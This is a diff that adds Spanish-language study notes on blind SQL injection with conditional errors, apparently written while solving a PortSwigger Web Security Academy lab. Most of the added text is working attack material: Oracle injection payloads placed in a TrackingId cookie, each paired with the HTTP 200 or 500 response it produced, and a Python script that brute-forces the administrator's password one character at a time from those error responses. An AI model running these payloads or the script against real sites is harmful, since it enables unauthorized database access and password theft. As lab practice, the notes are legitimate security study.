@@ -203,6 +203,105 @@ if __name__ == '__main__':
 
 
 
+####  #### Blind SQL injection with conditional errors ####  #### 
+Mediante los mensajes de " HTTP/2 200 OK " o " HTTP/2 500 Internal Server Error ", veremos si nuestra inyeccion fue correcta o devolvió un error. 
+
+TrackingId=KRHV8z6R9TLKeHgb'||(select null from dual)||'-- - 
+
+TrackingId=KRHV8z6R9TLKeHgb'||(select null from usersasdf where rownum=1)||'-- -    >> HTTP/2 500 Internal Server Error
+TrackingId=KRHV8z6R9TLKeHgb'||(select null from user where rownum=1)||'-- -         >> HTTP/2 200 OK
+
+
+
+Las siguientes dos lineas se basan en, como lo primero que se va a hacer es "from users where username='administrator', si existe, pasara al case que al tener un
+1/0 provocará un error, al poner un usuario erroneo el case no se ejecutará y no provocará error, por lo que la respuesta por parte del servidor sera un HTTP/2 200 OK
+
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then (1/0) else '' end from users where username='administrator')||'-- - >> HTTP/2 500 Internal Server Error
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then (1/0) else '' end from users where username='administrat')||'-- -   >> HTTP/2 200 OK
+
+
+
+
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'-- - >> HTTP/2 500 Internal Server Error
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrat')||'-- -   >> HTTP/2 200 OK
+
+
+
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)=19)||';  >> 200 OK
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)=20)||';  >> 500 Internal Server Error
+TrackingId=KRHV8z6R9TLKeHgb'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)=21)||';  >> 200 OK
+
+
+
+Con substr podemos comprobar la primera letra por la que empieza un usuario, cuando probamos 'b' no da error por lo que no empieza por b, pero en cambio cuando
+probamos con 'a' si da error, por lo que la primera letra del username será una 'a'. (la cuenta es administrator)
+'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||'; >> 200 OK
+'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'; >> 500 Internal Server Error
+
+
+
+TrackingId=mPoQfemlTUdZp2jp'||(select case when substr(password,1,1)='c' then to_char(1/0) else '' end from users where username='administrator')||'; >> 200 OK
+
+
+
+############################# SCRIPT ITERACIÓN CONTRASEÑA ###################################################################################################################
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+
+def def_handler(sig, frame):
+        print("[!] Saliendo...\n")
+        sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+
+main_url = "https://0a2300fe035549678029b8c50019007e.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+
+def makeRequest():
+
+        password = ""
+
+        p1 = log.progress("Fuerza bruta")
+        p1.status("Iniciando ataque de fuerza bruta")
+
+        time.sleep(2)
+
+
+        p2 = log.progress("Password")
+
+        for position in range(1,21):
+                for character in characters:
+                        cookies = {
+                        'TrackingId' : "TrackingId=mPoQfemlTUdZp2jp'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||' " % (position,character),
+                        'session' : 'I6RNtNHowIdDNDsi5vP6qCUSJ58jcAQO'
+                        }
+
+
+                        p1.status(cookies['TrackingId'])
+
+
+                        r = requests.get(main_url, cookies=cookies)
+
+                        if r.status_code == 500:
+                                password += character
+                                p2.status(password)
+                                break
+
+
+if __name__ == '__main__':
+
+        makeRequest()
+
+
+############################################################################################################################################################################
+
+
+
 
 
 
